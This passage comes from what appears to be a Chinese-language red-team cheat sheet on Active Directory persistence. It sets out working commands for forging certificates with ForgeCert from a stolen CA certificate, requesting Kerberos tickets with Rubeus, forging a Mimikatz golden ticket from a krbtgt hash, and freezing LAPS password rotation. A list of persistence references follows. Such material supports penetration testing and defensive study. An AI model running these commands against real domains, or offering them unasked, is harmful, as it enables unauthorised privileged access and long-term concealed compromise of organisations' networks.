* [ForgeCert](https://github.com/GhostPack/ForgeCert) - 使用这个 CA 证书来为任意活跃在域权限中的用户伪造证书

    ```ps1
    ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName harry@lab.local --NewCertPath harry.pfx --NewCertPassword Password123
    ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName DC$@lab.local --NewCertPath dc.pfx --NewCertPassword Password123
    ```

* 最后，你可以使用刚才搞到的这个凭证 (Certificate) 去请求一个 TGT 票据

    ```ps1
    Rubeus.exe asktgt /user:ron /certificate:harry.pfx /password:Password123
    ```

### 黄金票据 (Golden Ticket)

> 利用 Mimikatz 去锻造黄金票据

```ps1
kerberos::purge
kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
kerberos::tgt
```

### LAPS 持久化 (LAPS Persistence)

为了防止机器在未来的设定时间内自动更新其 LAPS 本地密码，将修改的更新日期设为未来时间也是一种可行的办法！

```ps1
Set-DomainObject -Identity <target_machine> -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```

## 参考和来源 (References)

* [Beware of the Shadowbunny - Using virtual machines to persist and evade detections - wunderwuzzi - September 23, 2020](https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/)
* [Corrupting the Hive Mind: Persistence Through Forgotten Windows Internals - Michael Weber - January 26, 2026](https://www.praetorian.com/blog/corrupting-the-hive-mind-persistence-through-forgotten-windows-internals/)
* [Golden Certificate - NOVEMBER 15, 2021](https://pentestlab.blog/2021/11/15/golden-certificate/)
* [Hijack the TypeLib. New COM persistence technique - CICADA8 - October 22, 2024](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
* [IIS Raid – Backdooring IIS Using Native Modules - February 19, 2020](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/)
* [Old Tricks Are Always Useful: Exploiting Arbitrary File Writes with Accessibility Tools - @phraaaaaaa - April 27, 2020](https://iwantmore.pizza/posts/arbitrary-write-accessibility-tools.html)
* [Persistence - BITS Jobs - @netbiosX](https://pentestlab.blog/2019/10/30/persistence-bits-jobs/)
* [Persistence - Checklist - @netbiosX](https://github.com/netbiosX/Checklists/blob/master/Persistence.md)
* [Persistence – Image File Execution Options Injection - @netbiosX](https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/)
* [Persistence – Registry Run Keys - @netbiosX](https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/)
* [Persistence – Winlogon Helper DLL - @netbiosX](https://pentestlab.blog/2020/01/14/persistence-winlogon-helper-dll/)
* [Persistence via WMI Event Subscription - Elastic Security Solution](https://www.elastic.co/guide/en/security/current/persistence-via-wmi-event-subscription.html)
* [PrivEsc: Abusing the Service Control Manager for Stealthy & Persistent LPE - 0xv1n - February 27, 2023](https://0xv1n.github.io/posts/scmanager/)
* [Sc sdset - Microsoft - August 31, 2016](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742037(v=ws.11))
* [SharPersist Windows Persistence Toolkit in C - Brett Hawkins - September 8, 2019](http://www.youtube.com/watch?v=K7o9RSVyazo)
* [Windows Persistence Commands - Pwn Wiki](http://pwnwiki.io/#!persistence/windows/index.md)
